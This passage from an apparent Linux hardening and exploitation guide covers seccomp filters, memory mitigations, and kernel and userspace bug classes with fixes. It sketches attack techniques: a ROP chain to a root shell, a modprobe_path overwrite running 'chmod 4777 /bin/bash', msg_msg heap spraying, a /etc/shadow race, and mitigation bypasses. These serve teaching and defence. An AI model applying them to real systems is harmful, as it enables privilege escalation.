    SECCOMP_RET_USER_NOTIF  - notify userspace supervisor (5.0+)
    SECCOMP_RET_LOG     - log and allow
```

### 9.3 Seccomp Filter in C

```c
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include 
#include 
#include 
#include 
#include 
#include 

/* Helper macros for BPF filter construction */
#define VALIDATE_ARCHITECTURE \
    BPF_STMT(BPF_LD|BPF_W|BPF_ABS, \
             (offsetof(struct seccomp_data, arch))), \
    BPF_JUMP(BPF_JMP|BPF_JEQ|BPF_K, AUDIT_ARCH_X86_64, 1, 0), \
    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_KILL_PROCESS)

#define LOAD_SYSCALL_NR \
    BPF_STMT(BPF_LD|BPF_W|BPF_ABS, \
             (offsetof(struct seccomp_data, nr)))

#define ALLOW_SYSCALL(name) \
    BPF_JUMP(BPF_JMP|BPF_JEQ|BPF_K, __NR_##name, 0, 1), \
    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ALLOW)

#define BLOCK_SYSCALL(name) \
    BPF_JUMP(BPF_JMP|BPF_JEQ|BPF_K, __NR_##name, 0, 1), \
    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_KILL_PROCESS)

#define KILL_PROCESS \
    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_KILL_PROCESS)

/* Install a strict seccomp filter for a web server */
int install_webserver_seccomp(void) {
    struct sock_filter filter[] = {
        /* 1. Validate architecture */
        VALIDATE_ARCHITECTURE,
        
        /* 2. Load syscall number */
        LOAD_SYSCALL_NR,
        
        /* 3. Allowlist of required syscalls */
        ALLOW_SYSCALL(read),
        ALLOW_SYSCALL(readv),
        ALLOW_SYSCALL(write),
        ALLOW_SYSCALL(writev),
        ALLOW_SYSCALL(close),
        ALLOW_SYSCALL(accept),
        ALLOW_SYSCALL(accept4),
        ALLOW_SYSCALL(recvfrom),
        ALLOW_SYSCALL(recvmsg),
        ALLOW_SYSCALL(sendto),
        ALLOW_SYSCALL(sendmsg),
        ALLOW_SYSCALL(sendfile),
        ALLOW_SYSCALL(epoll_wait),
        ALLOW_SYSCALL(epoll_ctl),
        ALLOW_SYSCALL(epoll_create1),
        ALLOW_SYSCALL(getsockopt),
        ALLOW_SYSCALL(setsockopt),
        ALLOW_SYSCALL(futex),
        ALLOW_SYSCALL(nanosleep),
        ALLOW_SYSCALL(clock_gettime),
        ALLOW_SYSCALL(getpid),
        ALLOW_SYSCALL(mmap),
        ALLOW_SYSCALL(munmap),
        ALLOW_SYSCALL(brk),
        ALLOW_SYSCALL(exit_group),
        ALLOW_SYSCALL(exit),
        ALLOW_SYSCALL(rt_sigreturn),
        ALLOW_SYSCALL(sigaltstack),
        ALLOW_SYSCALL(gettid),
        ALLOW_SYSCALL(openat),
        ALLOW_SYSCALL(fstat),
        ALLOW_SYSCALL(stat),
        ALLOW_SYSCALL(lstat),
        ALLOW_SYSCALL(lseek),
        ALLOW_SYSCALL(dup),
        ALLOW_SYSCALL(dup2),
        
        /* 4. Explicitly deny dangerous syscalls (belt and suspenders) */
        BLOCK_SYSCALL(execve),
        BLOCK_SYSCALL(execveat),
        BLOCK_SYSCALL(ptrace),
        BLOCK_SYSCALL(fork),
        BLOCK_SYSCALL(vfork),
        BLOCK_SYSCALL(clone),
        BLOCK_SYSCALL(kexec_load),
        BLOCK_SYSCALL(pivot_root),
        BLOCK_SYSCALL(mount),
        BLOCK_SYSCALL(umount2),
        BLOCK_SYSCALL(unshare),
        BLOCK_SYSCALL(setns),
        BLOCK_SYSCALL(init_module),
        BLOCK_SYSCALL(finit_module),
        BLOCK_SYSCALL(delete_module),
        
        /* 5. Default: deny everything else */
        KILL_PROCESS,
    };
    
    struct sock_fprog prog = {
        .len    = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
        .filter = filter,
    };

    /* Must set NO_NEW_PRIVS before loading seccomp filter */
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) {
        perror("prctl(NO_NEW_PRIVS)");
        return -1;
    }
    
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog) != 0) {
        perror("prctl(SECCOMP_FILTER)");
        return -1;
    }
    
    return 0;
}

int main(void) {
    printf("Installing seccomp filter...\n");
    
    if (install_webserver_seccomp() != 0) {
        fprintf(stderr, "Failed to install seccomp filter\n");
        return 1;
    }
    
    printf("Seccomp filter installed. Allowed: network I/O + file I/O + basic ops\n");
    printf("Attempting forbidden syscall (fork)...\n");
    
    /* This will kill the process */
    fork();
    
    printf("Should not reach here\n");
    return 0;
}
```

### 9.4 Seccomp in Go

```go
package main

import (
	"fmt"
	"log"
	"syscall"
	"unsafe"
)

// BPF instruction types
const (
	BPF_LD  = 0x00
	BPF_JMP = 0x05
	BPF_RET = 0x06
	BPF_W   = 0x00
	BPF_ABS = 0x20
	BPF_JEQ = 0x10
	BPF_K   = 0x00

	SECCOMP_MODE_FILTER   = 2
	SECCOMP_RET_ALLOW     = 0x7fff0000
	SECCOMP_RET_KILL_PROC = 0x80000000
	SECCOMP_RET_ERRNO     = 0x00050000

	PR_SET_NO_NEW_PRIVS = 38
	PR_SET_SECCOMP      = 22

	AUDIT_ARCH_X86_64 = 0xc000003e

	// Offsets in seccomp_data struct
	seccompDataArchOffset = 4
	seccompDataNrOffset   = 0
)

// SockFilter represents a single BPF instruction
type SockFilter struct {
	Code uint16
	JT   uint8
	JF   uint8
	K    uint32
}

// SockFprog is the BPF program structure passed to the kernel
type SockFprog struct {
	Len    uint16
	Filter *SockFilter
}

// bpfStmt creates a BPF statement instruction
func bpfStmt(code uint16, k uint32) SockFilter {
	return SockFilter{Code: code, JT: 0, JF: 0, K: k}
}

// bpfJump creates a BPF jump instruction
func bpfJump(code uint16, k uint32, jt, jf uint8) SockFilter {
	return SockFilter{Code: code, JT: jt, JF: jf, K: k}
}

// SeccompFilter builds and installs a seccomp filter
type SeccompFilter struct {
	instructions []SockFilter
}

func NewSeccompFilter() *SeccompFilter {
	f := &SeccompFilter{}
	// Architecture validation
	f.instructions = append(f.instructions,
		// Load arch field
		bpfStmt(BPF_LD|BPF_W|BPF_ABS, seccompDataArchOffset),
		// Check if x86_64
		bpfJump(BPF_JMP|BPF_JEQ|BPF_K, AUDIT_ARCH_X86_64, 1, 0),
		// Kill if wrong arch
		bpfStmt(BPF_RET|BPF_K, SECCOMP_RET_KILL_PROC),
		// Load syscall number
		bpfStmt(BPF_LD|BPF_W|BPF_ABS, seccompDataNrOffset),
	)
	return f
}

// Allow adds a syscall to the allowlist
func (f *SeccompFilter) Allow(syscallNr uint32) *SeccompFilter {
	f.instructions = append(f.instructions,
		bpfJump(BPF_JMP|BPF_JEQ|BPF_K, syscallNr, 0, 1),
		bpfStmt(BPF_RET|BPF_K, SECCOMP_RET_ALLOW),
	)
	return f
}

// DenyWithErrno adds a syscall that returns an error
func (f *SeccompFilter) DenyWithErrno(syscallNr uint32, errno uint32) *SeccompFilter {
	f.instructions = append(f.instructions,
		bpfJump(BPF_JMP|BPF_JEQ|BPF_K, syscallNr, 0, 1),
		bpfStmt(BPF_RET|BPF_K, SECCOMP_RET_ERRNO|(errno&0xffff)),
	)
	return f
}

// KillOnDefault kills the process for any unmatched syscall
func (f *SeccompFilter) KillOnDefault() *SeccompFilter {
	f.instructions = append(f.instructions,
		bpfStmt(BPF_RET|BPF_K, SECCOMP_RET_KILL_PROC),
	)
	return f
}

// Install applies the filter to the current process
func (f *SeccompFilter) Install() error {
	// Set no_new_privs first (required for unprivileged seccomp)
	if err := setNoNewPrivs(); err != nil {
		return fmt.Errorf("set no_new_privs: %w", err)
	}

	prog := SockFprog{
		Len:    uint16(len(f.instructions)),
		Filter: &f.instructions[0],
	}

	_, _, errno := syscall.Syscall(
		syscall.SYS_PRCTL,
		PR_SET_SECCOMP,
		SECCOMP_MODE_FILTER,
		uintptr(unsafe.Pointer(&prog)),
	)
	if errno != 0 {
		return fmt.Errorf("prctl(SECCOMP_MODE_FILTER): %w", errno)
	}
	return nil
}

func setNoNewPrivs() error {
	_, _, errno := syscall.Syscall6(
		syscall.SYS_PRCTL,
		PR_SET_NO_NEW_PRIVS,
		1, 0, 0, 0, 0,
	)
	if errno != 0 {
		return errno
	}
	return nil
}

func main() {
	filter := NewSeccompFilter().
		// Allow essential syscalls
		Allow(uint32(syscall.SYS_READ)).
		Allow(uint32(syscall.SYS_WRITE)).
		Allow(uint32(syscall.SYS_CLOSE)).
		Allow(uint32(syscall.SYS_EXIT_GROUP)).
		Allow(uint32(syscall.SYS_FUTEX)).
		Allow(uint32(syscall.SYS_MMAP)).
		Allow(uint32(syscall.SYS_MUNMAP)).
		Allow(uint32(syscall.SYS_BRK)).
		Allow(uint32(syscall.SYS_RT_SIGRETURN)).
		// Deny fork with EPERM instead of kill (for logging)
		DenyWithErrno(uint32(syscall.SYS_FORK), uint32(syscall.EPERM)).
		DenyWithErrno(uint32(syscall.SYS_CLONE), uint32(syscall.EPERM)).
		// Kill on anything else
		KillOnDefault()

	if err := filter.Install(); err != nil {
		log.Fatalf("Failed to install seccomp filter: %v", err)
	}

	fmt.Println("Seccomp filter installed successfully")
	fmt.Printf("PID: %d\n", syscall.Getpid())  // Allowed (getpid is in exit path)
}
```

### 9.5 Seccomp Notify: Userspace Supervision (Linux 5.0+)

`SECCOMP_RET_USER_NOTIF` allows a supervisor process to handle syscall decisions in userspace. This is used by container runtimes for fine-grained control:

```c
/* Supervisor side: intercept mknod in container */
#include <linux/seccomp.h>
#include <sys/ioctl.h>

/* In the container process: install filter with USER_NOTIF */
struct sock_filter filter[] = {
    VALIDATE_ARCHITECTURE,
    LOAD_SYSCALL_NR,
    /* mknod: notify supervisor */
    BPF_JUMP(BPF_JMP|BPF_JEQ|BPF_K, __NR_mknod, 0, 1),
    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_USER_NOTIF),
    /* Everything else: allow */
    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ALLOW),
};

/* Supervisor reads notifications from the notif fd */
int notif_fd = ...; /* received from container via SCM_RIGHTS */
struct seccomp_notif req;
struct seccomp_notif_resp resp;

while (ioctl(notif_fd, SECCOMP_IOCTL_NOTIF_RECV, &req) == 0) {
    /* Inspect: req.data.nr, req.data.args, req.pid */
    /* Make policy decision */
    
    resp.id    = req.id;
    resp.error = 0;       /* or -EPERM to deny */
    resp.val   = 0;       /* return value if allowed */
    resp.flags = SECCOMP_USER_NOTIF_FLAG_CONTINUE; /* or 0 to fake return */
    
    ioctl(notif_fd, SECCOMP_IOCTL_NOTIF_SEND, &resp);
}
```

---

## 10. Memory Safety and Exploitation Mitigations

### 10.1 Virtual Memory and Protection Bits

Every page in a process's virtual address space has permission bits that control access:

```
Page Table Entry (PTE) - x86_64 simplified:
Bit 0: Present (P) - page is in memory
Bit 1: Read/Write (R/W) - writable if set, read-only if clear
Bit 2: User/Supervisor (U/S) - user accessible if set
Bit 3: Write Through (PWT)
Bit 4: Cache Disable (PCD)
Bit 5: Accessed (A)
Bit 6: Dirty (D)
Bit 7: Page Size (PS)
Bit 8: Global (G)
Bit 63: Execute Disable (XD/NX/XN) - non-executable if set
```

**Memory regions and their protections:**

```
Process virtual address space (simplified):
============================================

0x400000         [Text segment]      r-xp  (read + execute, NO write)
0x600000         [Data segment]      rw-p  (read + write, NO execute)
0x600800         [BSS]               rw-p
0x...            [Heap]              rw-p  (grows up)
                 [mmap region]       various
0x7ff...         [Stack]             rw-p  (grows down)
0x7ffe...        [vDSO/vvar]         r-xp  (kernel-mapped)

Key security property:
- Writable pages are NOT executable (W^X / NX / DEP)
- Executable pages are NOT writable
- Stack is NOT executable (by default, with NX support)
```

```bash
# View memory mappings with protections
cat /proc//maps
# or
pmap -x 

# Example output:
# 55a1b0000000-55a1b0001000 r--p 00000000 fd:01 12345 /bin/ls
# 55a1b0001000-55a1b0005000 r-xp 00001000 fd:01 12345 /bin/ls
# 55a1b0005000-55a1b0007000 r--p 00005000 fd:01 12345 /bin/ls
# 55a1b0008000-55a1b0009000 r--p 00007000 fd:01 12345 /bin/ls
# 55a1b0009000-55a1b000a000 rw-p 00008000 fd:01 12345 /bin/ls
```

### 10.2 ASLR: Address Space Layout Randomization

ASLR randomizes the base addresses of process segments (stack, heap, mmap, VDSO). An attacker cannot hardcode addresses; they must first leak an address.

```bash
# ASLR levels (kernel.randomize_va_space)
# 0: No randomization
# 1: Randomize stack, mmap, VDSO (but not heap)
# 2: Full randomization (stack, mmap, VDSO, heap) - DEFAULT

cat /proc/sys/kernel/randomize_va_space
# Should be 2

# Enable
sysctl -w kernel.randomize_va_space=2

# Demonstrate ASLR
for i in $(seq 5); do
    cat /proc/self/maps | grep stack | head -1
done
# Stack address changes each time
```

**ASLR bypass techniques:**

1. **Information leak**: Read a pointer from process memory (e.g., via format string bug, use-after-free) to determine base address.

2. **Heap spray**: Allocate large amounts of memory with shellcode/ROP gadgets to increase probability of hitting target address.

3. **Partial overwrite**: 32-bit processes have low entropy (only ~8-16 bits). Brute force is feasible.

4. **JIT spraying**: Compile shellcode as JIT-compiled JavaScript/Java bytecode, then use a control-flow bug to jump into JIT page.

### 10.3 Stack Canaries (SSP: Stack Smashing Protection)

A stack canary is a random value placed between local variables and the saved return address. Before returning, the function checks if the canary is intact.

```
Stack frame with canary:
========================

High addresses
+------------------+
| Saved RBP        |  ← Attacker's target: overwrite return addr
+------------------+
| Saved RIP        |  ← Attacker's target
+------------------+
| CANARY           |  ← Random 8-byte value (with null byte on x86)
+------------------+
| Local var 2      |
+------------------+
| Local var 1      |  ← Buffer overflow starts here
+------------------+
Low addresses

If buffer overflow overwrites canary → detected on function return
```

**Canary types:**
- **Random**: Kernel generates random value at startup (`/dev/urandom`)
- **Terminator**: Always includes `\x00` byte to stop string operations
- **Random XOR**: Canary XORed with frame pointer (prevents partial overwrites)

```bash
# Check if binary has SSP
checksec --file=/bin/bash
# or
readelf -s /bin/bash | grep __stack_chk_fail

# Compile with SSP
gcc -fstack-protector-strong -o secure_prog prog.c
# Options: -fstack-protector (only arrays >8B), 
#          -fstack-protector-strong (better, arrays + alloca + local addrs)
#          -fstack-protector-all (all functions)

# Disable SSP (for testing only)
gcc -fno-stack-protector -o vulnerable prog.c
```

**SSP bypass:**
- If the attacker can leak the canary value first, they can include the correct canary in their overflow
- Some formats (printf `%n`) can write arbitrary values

### 10.4 NX/DEP: No Execute

NX (AMD) / XD (Intel) / DEP (Windows) marks pages as non-executable. This prevents directly injecting and executing shellcode.

```bash
# Check if CPU supports NX
grep nx /proc/cpuinfo | head -1
# flags : ... nx ...

# Check if kernel uses NX
dmesg | grep -i "NX"
# [    0.000000] NX (Execute Disable) protection: active

# Check if binary has NX
checksec --file=./mybin
# NX: NX enabled
```

**NX bypass: Return-Oriented Programming (ROP)**

Instead of injecting code, the attacker chains existing code fragments ending in `ret` instruction (called "gadgets"). No new code is executed — only existing code in new order.

```
ROP chain on stack:
===================

┌─────────────────────┐  ← RSP after overflow
│ gadget1 address     │  pop rdi; ret
│ value_for_rdi       │  ← "/bin/sh" string address
│ gadget2 address     │  pop rsi; ret  
│ 0                   │  ← NULL for argv
│ gadget3 address     │  pop rdx; ret
│ 0                   │  ← NULL for envp
│ syscall_gadget addr │  syscall; ret
└─────────────────────┘

When overflow executes:
  RSP → gadget1 (pop rdi; ret)
    → pops "/bin/sh" into RDI
    → ret to gadget2 (pop rsi; ret)
    → pops NULL into RSI
    → ret to gadget3
    → pops NULL into RDX
    → ret to syscall gadget
    → execve("/bin/sh", NULL, NULL)
    → Shell!
```

**ROP mitigation: Control Flow Integrity (CFI)**

CFI ensures that indirect calls/jumps only reach valid targets:
- **Forward-edge CFI**: Validates targets of indirect calls (function pointers, vtables)
- **Backward-edge CFI**: Validates return addresses (shadow stack)

**Intel CET (Control-flow Enforcement Technology)**:
- **IBT (Indirect Branch Tracking)**: Requires `ENDBRANCH` instruction at all valid indirect-call/jump targets. CPU faults on any indirect jump to non-`ENDBRANCH` location.
- **Shadow Stack (SHSTK)**: Hardware-maintained parallel stack for return addresses only. `RET` validates against shadow stack.

```bash
# Check if CPU supports CET
grep -m1 shstk /proc/cpuinfo  # Shadow stack
grep -m1 ibt /proc/cpuinfo    # Indirect branch tracking

# Compile with CET support (gcc 8+)
gcc -fcf-protection=full -o secure_prog prog.c
# Options: full, branch (IBT), return (shadow stack), none
```

### 10.5 PIE: Position Independent Executable

PIE allows the kernel to load the executable itself at a random address (not just shared libraries). Without PIE, the executable's text, data, and BSS are at fixed addresses, giving the attacker known gadget locations.

```bash
# Check for PIE
checksec --file=./mybin
# PIE: PIE enabled

# Compile with PIE
gcc -fpie -pie -o secure_prog prog.c

# Check ELF type (ET_DYN = PIE, ET_EXEC = no PIE)
file ./mybin
readelf -h ./mybin | grep Type
```

### 10.6 RELRO: Relocation Read-Only

RELRO protects the Global Offset Table (GOT) and other sections from being overwritten after startup:

- **Partial RELRO**: `.init_array`, `.fini_array`, `.jcr` sections are mapped read-only. GOT is NOT protected.
- **Full RELRO**: All GOT entries are resolved at startup, then the entire GOT is remapped read-only.

```bash
# Check RELRO
checksec --file=./mybin
# RELRO: Full RELRO

# Compile with Full RELRO
gcc -Wl,-z,relro,-z,now -o secure_prog prog.c
# -z relro: partial RELRO
# -z now: resolves all symbols at startup (enables full RELRO)
```

**GOT hijacking (without Full RELRO):**

```
Normal function call:
    call printf@plt
    → PLT stub → reads GOT[printf_idx] → jumps to libc printf

After GOT overwrite:
    call printf@plt
    → PLT stub → reads GOT[printf_idx] → jumps to shellcode/gadget
```

Full RELRO makes GOT read-only at runtime, preventing this attack.

### 10.7 SMEP/SMAP: Kernel Protection from User Memory

**SMEP (Supervisor Mode Execution Prevention)**: Prevents the kernel from executing code in user-space pages. Critical for preventing "ret2user" attacks where the attacker puts shellcode in userspace and makes the kernel jump to it.

**SMAP (Supervisor Mode Access Prevention)**: Prevents the kernel from reading/writing user-space memory UNLESS explicitly allowed (`CLAC`/`STAC` instructions bracket the access).

```bash
# Check CPU support
grep -m1 smep /proc/cpuinfo
grep -m1 smap /proc/cpuinfo

# Kernel checks at boot
dmesg | grep -E "SMEP|SMAP"
```

**SMAP bypass via `copy_from_user()`:**

The kernel MUST use `copy_from_user()` to read user data (sets RFLAGS.AC temporarily). Any kernel path that reads user data without `copy_from_user()` is both a bug AND exploitable even with SMAP.

### 10.8 KASLR: Kernel ASLR

```bash
# Check KASLR
cat /proc/cmdline | grep -o 'nokaslr'
# If output: KASLR disabled (bad!)

# KASLR entropy
dmesg | grep "KASLR"

# Limit information leaks (restrict /proc/kallsyms)
echo 2 > /proc/sys/kernel/kptr_restrict
# 0: Visible to all
# 1: Visible only to CAP_SYSLOG
# 2: Hidden from all (even root in userspace)

# Restrict dmesg
echo 1 > /proc/sys/kernel/dmesg_restrict
```

**KASLR bypass techniques:**
1. **KPTI bypass**: Some KPTI implementations have information leaks in the trampoline page.
2. **/proc/kallsyms** (if `kptr_restrict=0`): Directly reads kernel symbol addresses.
3. **Side-channel timing**: CPU cache timing can reveal kernel memory layout (Meltdown).
4. **`perf_event_open`**: Can leak kernel addresses via hardware performance counters.

---

## 11. Kernel Exploitation Classes

### 11.1 Use-After-Free (UAF) in Kernel

Use-After-Free is currently the most common kernel vulnerability class. The pattern:

```c
/* Simplified UAF pattern */

struct obj {
    void (*func)(void);  /* function pointer */
    char data[64];
};

/* Thread 1: allocates and uses object */
struct obj *p = kmalloc(sizeof(*p), GFP_KERNEL);
p->func = do_something;
/* ... later: frees the object */
kfree(p);

/* Thread 2: UAF */
p->func();  /* p points to freed memory! */
```

**Exploitation path:**

1. Free the victim object (triggering the UAF)
2. Fill the freed memory with controlled data (heap spray) — allocate same-sized object whose contents you control
3. Trigger the UAF → kernel executes attacker-controlled function pointer

**Famous examples:**
- **CVE-2021-22555**: netfilter heap-out-of-bounds write / UAF → root
- **CVE-2022-0185**: fs_context UAF → namespace escape → root
- **CVE-2022-2588**: Route4 filter UAF → root
- **CVE-2023-0179**: netfilter stack OOB read → info leak → UAF chain

### 11.2 Heap Spray Techniques

Kernel heap spray: Allocate many objects to fill freed memory with controlled data.

**Common spray objects:**

```c
/* msg_msg: IPC message buffer, variable size, no strict validation */
/* Used extensively in modern kernel exploits */
#include <sys/ipc.h>
#include <sys/msg.h>

int msqid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
struct {
    long mtype;
    char mtext[SIZE];  /* SIZE = target allocation size - 0x30 (msg_msg header) */
} msg = { .mtype = 1 };

/* Fill mtext with attacker-controlled data */
memset(msg.mtext, 0x41, sizeof(msg.mtext));

/* Spray: allocate many such messages */
for (int i = 0; i < 1000; i++) {
    msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
}
```

**Other spray primitives:**
- `sendmsg` with ancillary data
- `setxattr` / `getxattr` (arbitrary size heap allocation)
- `add_key` (keyring-based, arbitrary size)
- `pipe_buffer` (4096-byte chunks)

### 11.3 Kernel Privilege Escalation Techniques

**Classic: Overwrite `cred` structure:**

```c
/* In kernel exploit shellcode (runs in Ring 0) */
/* Strategy: find current process's cred, zero out uid/gid */

void escalate(void) {
    /* commit_creds(prepare_kernel_cred(NULL)) */
    /* This is the classic pattern */
    
    /* prepare_kernel_cred(NULL): allocate creds with all UIDs=0, all caps */
    /* commit_creds(): install those creds as current process's creds */
    
    /* After this, the process is root with all capabilities */
}
```

**Modern technique: Overwrite `modprobe_path`:**

```c
/* modprobe_path is a global kernel string:
   /proc/sys/kernel/modprobe (default: "/sbin/modprobe")
   
   When a process tries to execute an unknown binary format,
   the kernel calls modprobe to load the right module.
   
   If we overwrite this string to point to our script:
   1. Kernel writes the modprobe_path as root
   2. Our script gets executed as root
*/

/* Requires: kernel write primitive to overwrite modprobe_path global */
char *modprobe_path = "/tmp/evil.sh";
/* evil.sh: chmod 4777 /bin/bash */

/* Trigger: execute file with unknown magic bytes */
/* Kernel calls /tmp/evil.sh as root → privilege escalation */
```

**Stack/Heap overflows in kernel:**

```c
/* CVE-2017-7308: af_packet ring buffer integer overflow */
/* Integer overflow in packet_set_ring() → heap overflow → UAF chain */

/* The attacker controls tp_block_size, tp_frame_size:
   req.tp_block_size = 0x10000000  (large value)
   req.tp_frame_size = 0x10000000
   Total size overflows to small value
   Heap allocation is small but kernel writes large amount
   → heap overflow → adjacent object corruption
*/
```

### 11.4 Null Pointer Dereference

```c
/* Kernel code: */
struct foo *p = find_something(user_input);  /* may return NULL */
p->field = value;  /* if p is NULL, this is NULL deref → kernel panic */
                   /* But: if user can mmap address 0x0 AND place shellcode
                      there, null deref → code execution at address 0! */

/* Mitigation: mmap_min_addr prevents mapping at 0 */
cat /proc/sys/vm/mmap_min_addr
# 65536 (0x10000) — cannot mmap below this address

# Set restrictive minimum
sysctl -w vm.mmap_min_addr=65536
```

### 11.5 Race Conditions (TOCTOU and Data Races)

**Time-of-Check to Time-of-Use (TOCTOU):**

```c
/* Kernel TOCTOU example: */
/* Thread 1: */
if (access(path, W_OK) == 0) {   /* Check: is user allowed? */
    /* ... some work ... */
    fd = open(path, O_WRONLY);   /* Use: open the file */
    /* RACE: attacker can replace path with symlink between check and use */
}

/* Thread 2 (attacker): */
while (1) {
    rename("/tmp/normal_file", path);   /* normal file */
    rename("/etc/shadow", path);         /* privileged file */
}
/* Sometimes the check sees normal_file, but open() sees /etc/shadow */
```

**CVE-2016-5195 (Dirty COW)**: The most famous Linux kernel race condition:

```
Dirty COW (Copy-On-Write) race:

Normal COW:
  Process reads memory-mapped read-only file
  → Gets a read-only mapping
  If process tries to write:
    → Kernel makes private copy (COW)
    → Process writes to the copy

Dirty COW race:
  Two threads:
    Thread 1: madvise(MADV_DONTNEED) on the mapping repeatedly
    Thread 2: write to /proc/self/mem targeting the mapping

  The race: 
    Kernel does COW (makes copy)
    Thread 1: MADV_DONTNEED discards the copy
    Thread 1 is now pointing at the original read-only page again
    Thread 2: writes to the original read-only page
    
  Result: Write to read-only memory mapped file (e.g., setuid binary, /etc/passwd)
```

**Dirty Pipe (CVE-2022-0847)**: A related bug allowing any user to overwrite read-only files via pipe page cache manipulation.

### 11.6 Integer Overflows in Kernel

```c
/* VULNERABLE: size calculation overflow */
int count = user_input;  /* attacker controls */
int size  = count * sizeof(struct foo);  /* overflow if count is large */
char *buf = kmalloc(size, GFP_KERNEL);   /* allocates tiny buffer */
/* subsequent write using count (large) → heap overflow */

/* SECURE: use safe multiplication */
#include <linux/overflow.h>

size_t size;
if (check_mul_overflow((size_t)count, sizeof(struct foo), &size)) {
    return -EOVERFLOW;
}
char *buf = kmalloc(size, GFP_KERNEL);
```

---

## 12. Userspace Exploitation: Stack, Heap, and Beyond

### 12.1 Stack Buffer Overflows

The classic vulnerability. Overwhelming a fixed-size buffer on the stack overwrites adjacent data, including the saved return address.

**Vulnerable C code:**

```c
/* VULNERABLE: classic stack overflow */
#include 
#include 

void vulnerable_function(const char *input) {
    char buffer[64];
    strcpy(buffer, input);  /* No bounds checking! */
    /* If input > 64 bytes, overflows buffer, overwrites return address */
}

int main(int argc, char *argv[]) {
    if (argc < 2) return 1;
    vulnerable_function(argv[1]);
    return 0;
}
```

**Safe alternatives:**

```c
/* SECURE: bounded copy */
void safe_function(const char *input, size_t input_len) {
    char buffer[64];
    
    /* Option 1: strlcpy (BSD, not POSIX but common) */
    strlcpy(buffer, input, sizeof(buffer));
    
    /* Option 2: snprintf */
    snprintf(buffer, sizeof(buffer), "%s", input);
    
    /* Option 3: explicit bounds check */
    if (input_len >= sizeof(buffer)) {
        /* Handle error: input too long */
        return;
    }
    memcpy(buffer, input, input_len);
    buffer[input_len] = '\0';
}

/* BETTER: avoid fixed-size buffers entirely */
#include 
char *dynamic_copy(const char *input, size_t input_len) {
    /* Validate: refuse unreasonably large inputs */
    if (input_len > 1024 * 1024) {  /* 1MB max */
        errno = EINVAL;
        return NULL;
    }
    
    char *buf = malloc(input_len + 1);
    if (!buf) return NULL;
    
    memcpy(buf, input, input_len);
    buf[input_len] = '\0';
    return buf;
}
```

### 12.2 Heap Vulnerabilities

**Heap overflow:**

```c
/* VULNERABLE */
struct context {
    char name[32];
    void (*callback)(void);  /* function pointer */
};

struct context *ctx = malloc(sizeof(*ctx));
/* User controls name_len: if > 32, overwrites callback */
memcpy(ctx->name, user_name, name_len);
ctx->callback();  /* if overwritten → attacker controls execution */
```

**Use-After-Free:**

```c
/* VULNERABLE UAF pattern */
struct widget *w = create_widget();
register_callback(w, on_event);  /* stores pointer to w */

/* Later: */
free(w);          /* w is freed */
handle_events();  /* on_event(w) is called — w is dangling pointer! */
w->data = 42;     /* UAF: writing to freed memory */
```

**Secure heap patterns:**

```c
#include 
#include 
#include 

/* Pattern 1: Zero out on free (reduces window for data exposure) */
void secure_free(void **ptr, size_t size) {
    if (ptr && *ptr) {
        explicit_bzero(*ptr, size);  /* Compiler won't optimize away */
        free(*ptr);
        *ptr = NULL;  /* Nullify to catch UAF */
    }
}

/* Pattern 2: Use with automatic cleanup (cleanup attribute - GCC/Clang) */
static void cleanup_ptr(void **p) {
    if (p && *p) {
        free(*p);
        *p = NULL;
    }
}
#define AUTO_FREE __attribute__((cleanup(cleanup_ptr)))

void example(void) {
    AUTO_FREE char *buf = malloc(256);  /* Automatically freed on scope exit */
    if (!buf) return;
    /* ... use buf ... */
    /* Freed automatically when function returns or breaks */
}

/* Pattern 3: Reference counting to prevent UAF */
struct refcounted {
    int refcount;
    /* ... data ... */
};

struct refcounted *ref_get(struct refcounted *obj) {
    if (obj) __atomic_fetch_add(&obj->refcount, 1, __ATOMIC_SEQ_CST);
    return obj;
}

void ref_put(struct refcounted *obj) {
    if (obj && __atomic_sub_fetch(&obj->refcount, 1, __ATOMIC_SEQ_CST) == 0) {
        secure_free((void **)&obj, sizeof(*obj));
    }
}
```

### 12.3 Format String Vulnerabilities

Format string vulnerabilities occur when user-controlled data is passed as the format string to `printf`-family functions.

```c
/* VULNERABLE */
char user_input[256];
fgets(user_input, sizeof(user_input), stdin);
printf(user_input);  /* DANGEROUS: user controls format string */

/* %x: read stack values (information disclosure)
   %n: WRITE the count of printed chars to an address on stack
   %s: read arbitrary memory as string
   %$x: read n-th argument (positional) */
```

**Attack with `%n`:**

```
printf format: "%100x%n"
Effect: Print 100 chars, then write 100 to the address on the stack
        (the implicit 4th argument to printf, which is stack content)
With positional: "%<addr>c%<arg>$n" → write 'addr' to memory location
```

**Secure alternatives:**

```c
/* ALWAYS use explicit format strings */
printf("%s", user_input);   /* Safe: user_input is just a string arg */
fprintf(logfile, "%s\n", user_input);

/* For logging functions: */
void safe_log(const char *message) {
    syslog(LOG_INFO, "%s", message);  /* Safe */
    /* NOT: syslog(LOG_INFO, message); */
}
```

### 12.4 Integer Vulnerabilities

```c
/* VULNERABLE: signed/unsigned confusion */
void process_data(int user_len) {
    char *buf = malloc(user_len + 1);
    if (!buf) return;
    /* If user_len = -1: malloc(0) → success, tiny allocation */
    /* Then memcpy(-1 bytes) → massive overflow */
    memcpy(buf, source, user_len);
}

/* VULNERABLE: integer overflow in size calc */
size_t count = get_user_count();  /* attacker controls */
char *arr = malloc(count * sizeof(uint64_t));
/* count = SIZE_MAX/8 + 1 → overflow → tiny allocation */
/* Then write 'count' elements → heap overflow */

/* SECURE: validated arithmetic */
#include 
#include 

/* Safe multiplication with overflow check */
static inline int safe_mul_size(size_t a, size_t b, size_t *result) {
    if (a != 0 && b > SIZE_MAX / a) {
        return -1;  /* Overflow */
    }
    *result = a * b;
    return 0;
}

/* Safe addition with overflow check */
static inline int safe_add_size(size_t a, size_t b, size_t *result) {
    if (b > SIZE_MAX - a) {
        return -1;  /* Overflow */
    }
    *result = a + b;
    return 0;
